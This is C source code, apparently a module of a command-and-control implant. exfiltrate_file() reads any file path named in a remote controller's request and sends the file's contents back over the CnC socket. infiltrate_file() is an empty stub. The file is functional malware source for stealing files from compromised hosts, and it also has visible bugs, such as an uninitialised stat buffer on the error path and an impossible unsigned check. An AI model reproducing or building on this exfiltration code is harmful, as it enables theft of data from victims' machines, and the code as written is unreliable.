#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>

#include "cnc_prot.h"
#include "actions.h"

void exfiltrate_file(int sockfd, struct cnc_request *req)
{
    struct cnc_response *res;
    struct exf_format_req *exf_req;
    struct exf_format_res *exf_res;
    enum exf_file_error err = GOOD;
    struct stat statbuf;
    size_t n;
    int fd;

    exf_req = get_exf_from_cnc_req(req);
    printf("File path: %s\n", exf_req->path);

    if ((fd = open(exf_req->path, O_RDONLY)) < 0)
    {
        perror("Error opening file");
        err = OPEN_ERROR;
        goto finish;
    }

    if (fstat(fd, &statbuf) < 0)
    {
        perror("Error on fstat");
        err = STAT_ERROR;
        goto finish;
    }

    printf("File size: %d\n", statbuf.st_size);

finish:
    res = cnc_exf_res_init(statbuf.st_size, err);
    exf_res = get_exf_from_cnc_res(res);

    printf("Response length: %u\n", res->res_len);

    if (err != GOOD)
        goto out;

    if ((n = read(fd, exf_res->content, exf_res->content_len)) != exf_res->content_len)
    {
        perror("Failed to read from file");
        exf_res->err = READ_ERROR;
        if (n < 0) n = 0;
        res->res_len -= exf_res->content_len - n;
        
    }

out:
    write(sockfd, res, res->res_len);
    free(res);
    res = NULL;

    return;
}

void infiltrate_file(int sockfd, struct cnc_request *req)
{
}
